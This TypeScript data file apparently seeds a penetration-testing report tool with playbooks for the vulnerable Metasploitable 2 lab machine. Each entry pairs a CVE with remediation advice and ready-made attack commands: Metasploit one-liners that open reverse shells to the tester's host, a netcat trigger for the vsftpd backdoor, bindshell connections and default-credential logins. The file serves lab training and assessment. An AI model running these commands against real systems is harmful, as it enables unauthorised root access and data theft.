import { PlaybookVector } from '../types/vapt';

export const INITIAL_PLAYBOOK_VECTORS: PlaybookVector[] = [
  {
    id: 'vsftpd-234',
    port: '21',
    protocol: 'tcp',
    service: 'vsftpd 2.3.4',
    cve: 'CVE-2011-2523',
    cvss: '10.0',
    severity: 'Critical',
    title: 'vsftpd 2.3.4 Backdoor Command Execution',
    summary:
      'Metasploitable 2 ships with a compromised build of vsftpd 2.3.4. Sending a username ending in ":)" triggers a root bindshell listening on TCP port 6200.',
    commands: [
      {
        label: '1. Verify FTP banner with Nmap',
        cmd: (cfg) => `nmap -p 21 -sV --script ftp-vsftpd-backdoor ${cfg.targetIp}`,
      },
      {
        label: '2. Exploit via Metasploit',
        cmd: (cfg) =>
          `msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS ${cfg.targetIp}; run"`,
      },
      {
        label: '3. Manual trigger + Netcat check',
        cmd: (cfg) =>
          `printf "USER backdoor:)\\r\\nPASS test\\r\\n" | nc -w 2 ${cfg.targetIp} 21 && nc ${cfg.targetIp} 6200`,
      },
    ],
    expectedProof: 'uid=0(root) gid=0(root) groups=0(root)',
    impact:
      'Unauthenticated remote attackers gain immediate root-level shell access, allowing full compromise of confidentiality, integrity, and availability.',
    remediation:
      'Decommission vsftpd 2.3.4 immediately, install a verified upstream package checksum-checked from official repositories, and disable anonymous/unneeded FTP services in favor of SFTP.',
    verified: false,
    includeInReport: true,
    labNotes: '',
    evidenceOutput: '',
  },
  {
    id: 'samba-usermap',
    port: '139 / 445',
    protocol: 'tcp',
    service: 'Samba smbd 3.0.20-Debian',
    cve: 'CVE-2007-2447',
    cvss: '9.3',
    severity: 'Critical',
    title: 'Samba "username map script" Remote Command Execution',
    summary:
      'Samba 3.0.20 through 3.0.25rc3 fails to sanitize shell metacharacters in the username field when the non-default "username map script" option is enabled.',
    commands: [
      {
        label: '1. Enumerate SMB shares & version',
        cmd: (cfg) => `enum4linux -a ${cfg.targetIp}`,
      },
      {
        label: '2. Exploit via Metasploit',
        cmd: (cfg) =>
          `msfconsole -q -x "use exploit/multi/samba/usermap_script; set RHOSTS ${cfg.targetIp}; set LHOST ${cfg.kaliIp}; run"`,
      },
    ],
    expectedProof: 'Command shell session opened -> id returns uid=0(root)',
    impact:
      'Remote unauthenticated code execution as the root user over SMB ports 139/445 without valid credentials.',
    remediation:
      'Upgrade Samba to a patched supported release (>= 3.0.25), remove "username map script" if unused, and restrict SMB ports to trusted internal subnets via host firewall.',
    verified: false,
    includeInReport: true,
    labNotes: '',
    evidenceOutput: '',
  },
  {
    id: 'ingreslock-1524',
    port: '1524',
    protocol: 'tcp',
    service: 'ingreslock bindshell',
    cve: 'CWE-284 (Misconfiguration)',
    cvss: '9.8',
    severity: 'Critical',
    title: 'Unauthenticated Root Bindshell on Port 1524',
    summary:
      'TCP port 1524 exposes an active bindshell daemon directly mapped to /bin/sh with root privileges without authentication.',
    commands: [
      {
        label: '1. Confirm open port 1524',
        cmd: (cfg) => `nmap -p 1524 -sV ${cfg.targetIp}`,
      },
      {
        label: '2. Connect directly with Netcat',
        cmd: (cfg) => `nc -nv ${cfg.targetIp} 1524`,
      },
    ],
    expectedProof: 'root@metasploitable:/# id -> uid=0(root) gid=0(root)',
    impact:
      'Immediate, zero-authentication root shell access to any host able to reach TCP port 1524.',
    remediation:
      'Terminate the bindshell process, inspect /etc/inetd.conf to remove unauthorized shell bindings, and audit all listening sockets using ss -tulnp.',
    verified: false,
    includeInReport: true,
    labNotes: '',
    evidenceOutput: '',
  },
  {
    id: 'unrealircd-6667',
    port: '6667',
    protocol: 'tcp',
    service: 'UnrealIRCd 3.2.8.1',
    cve: 'CVE-2010-2075',
    cvss: '9.8',
    severity: 'Critical',
    title: 'UnrealIRCd 3.2.8.1 Trojaned Source Backdoor',
    summary:
      'A maliciously modified archive of UnrealIRCd 3.2.8.1 executes arbitrary OS commands whenever a client sends a string prefixed with "AB;".',
    commands: [
      {
        label: '1. Scan IRC port 6667',
        cmd: (cfg) => `nmap -p 6667 -sV --script irc-unrealircd-backdoor ${cfg.targetIp}`,
      },
      {
        label: '2. Exploit via Metasploit',
        cmd: (cfg) =>
          `msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS ${cfg.targetIp}; set PAYLOAD cmd/unix/reverse_perl; set LHOST ${cfg.kaliIp}; run"`,
      },
    ],
    expectedProof: 'Reverse shell opened under server account (uid=0(root) on Metasploitable 2)',
    impact:
      'Allows any network-adjacent user to execute arbitrary system commands on the target machine.',
    remediation:
      'Remove the trojaned UnrealIRCd installation, verify PGP signatures and SHA256 hashes before deploying software, and disable unnecessary IRC daemons.',
    verified: false,
    includeInReport: false,
    labNotes: '',
    evidenceOutput: '',
  },
  {
    id: 'rlogin-rsh',
    port: '512 / 513 / 514',
    protocol: 'tcp',
    service: 'rsh / rlogin / rexec',
    cve: 'CWE-287 (Legacy Trust)',
    cvss: '9.1',
    severity: 'Critical',
    title: 'Unencrypted Legacy r-Services Trust Misconfiguration',
    summary:
      'Berkeley r-services (rlogin/rsh) rely on weak host-based trust (/etc/hosts.equiv or .rhosts with "+ +"), permitting passwordless root login.',
    commands: [
      {
        label: '1. Install rsh-client (if missing) & connect',
        cmd: (cfg) => `rlogin -l root ${cfg.targetIp}`,
      },
      {
        label: '2. Execute single command via rsh',
        cmd: (cfg) => `rsh -l root ${cfg.targetIp} "id; hostname; uname -a"`,
      },
    ],
    expectedProof: 'uid=0(root) gid=0(root) groups=0(root) without password prompt',
    impact:
      'Cleartext authentication and wildcard host trust enable trivial passwordless privilege compromise and lateral movement.',
    remediation:
      'Disable rshd, rlogind, and rexecd in /etc/inetd.conf, remove /etc/hosts.equiv and ~/.rhosts files, and enforce SSH with key-based authentication.',
    verified: false,
    includeInReport: true,
    labNotes: '',
    evidenceOutput: '',
  },
  {
    id: 'tomcat-8180',
    port: '8180',
    protocol: 'tcp',
    service: 'Apache Tomcat 5.5',
    cve: 'CWE-798 (Default Credentials)',
    cvss: '8.8',
    severity: 'High',
    title: 'Apache Tomcat Manager Default Credentials & WAR Upload RCE',
    summary:
      'The Tomcat Manager interface on port 8180 accepts default credentials (tomcat:tomcat) and permits authenticated deployment of malicious .war archives.',
    commands: [
      {
        label: '1. Probe Tomcat Manager with curl',
        cmd: (cfg) => `curl -i -u tomcat:tomcat http://${cfg.targetIp}:8180/manager/html`,
      },
      {
        label: '2. Deploy WAR shell via Metasploit',
        cmd: (cfg) =>
          `msfconsole -q -x "use exploit/multi/http/tomcat_mgr_upload; set RHOSTS ${cfg.targetIp}; set RPORT 8180; set HttpUsername tomcat; set HttpPassword tomcat; set LHOST ${cfg.kaliIp}; run"`,
      },
    ],
    expectedProof: 'Meterpreter/Java shell opened as tomcat55 user',
    impact:
      'Attackers can deploy arbitrary Java web applications, gaining remote command execution on the application server.',
    remediation:
      'Change all default manager passwords, restrict /manager/html access by IP allowlist, disable remote WAR deployment in production, and upgrade Tomcat 5.5 (EOL).',
    verified: false,
    includeInReport: true,
    labNotes: '',
    evidenceOutput: '',
  },
  {
    id: 'dvwa-http',
    port: '80',
    protocol: 'tcp',
    service: 'Apache httpd 2.2.8 (PHP/5.2.4)',
    cve: 'CWE-89 / CWE-78',
    cvss: '8.6',
    severity: 'High',
    title: 'Web Application SQL Injection & OS Command Injection (DVWA / Mutillidae)',
    summary:
      'Port 80 hosts Apache 2.2.8 with vulnerable PHP applications (DVWA and Mutillidae) susceptible to SQL injection, command injection, and directory enumeration.',
    commands: [
      {
        label: '1. Run Nikto web vulnerability scan',
        cmd: (cfg) => `nikto -h http://${cfg.targetIp}/`,
      },
      {
        label: '2. Directory discovery with Gobuster / Dirb',
        cmd: (cfg) => `dirb http://${cfg.targetIp}/ /usr/share/wordlists/dirb/common.txt`,
      },
    ],
    expectedProof: 'Discovered /dvwa/, /mutillidae/, /phpMyAdmin/ and extracted database/OS output',
    impact:
      'Exposes backend MySQL databases, user credentials, and underlying OS command execution through unsanitized web parameters.',
    remediation:
      'Use parameterized queries (prepared statements), strictly validate input against allowlists, disable phpinfo/admin exposure, and upgrade EOL Apache/PHP stacks.',
    verified: false,
    includeInReport: false,
    labNotes: '',
    evidenceOutput: '',
  },
  {
    id: 'postgres-5432',
    port: '5432',
    protocol: 'tcp',
    service: 'PostgreSQL 8.3.0 - 8.3.7',
    cve: 'CVE-2009-3229 / Weak Auth',
    cvss: '8.1',
    severity: 'High',
    title: 'PostgreSQL Default Credentials & Server-Side Code Execution',
    summary:
      'PostgreSQL listens on all interfaces (0.0.0.0:5432) and accepts default superuser credentials (postgres:postgres), enabling database dump and UDF code execution.',
    commands: [
      {
        label: '1. Test PostgreSQL login from Kali',
        cmd: (cfg) => `PGPASSWORD=postgres psql -h ${cfg.targetIp} -U postgres -c "SELECT version();"`,
      },
      {
        label: '2. Validate RCE via Metasploit',
        cmd: (cfg) =>
          `msfconsole -q -x "use exploit/linux/postgres/postgres_payload; set RHOSTS ${cfg.targetIp}; set LHOST ${cfg.kaliIp}; run"`,
      },
    ],
    expectedProof: 'PostgreSQL version banner returned and Meterpreter session opened as postgres',
    impact:
      'Database superuser access leads to full data exfiltration and arbitrary native library/OS execution.',
    remediation:
      'Bind PostgreSQL to localhost (listen_addresses = \'localhost\'), enforce SCRAM-SHA-256 authentication with strong passwords, and upgrade PostgreSQL 8.3 (EOL).',
    verified: false,
    includeInReport: false,
    labNotes: '',
    evidenceOutput: '',
  },
];
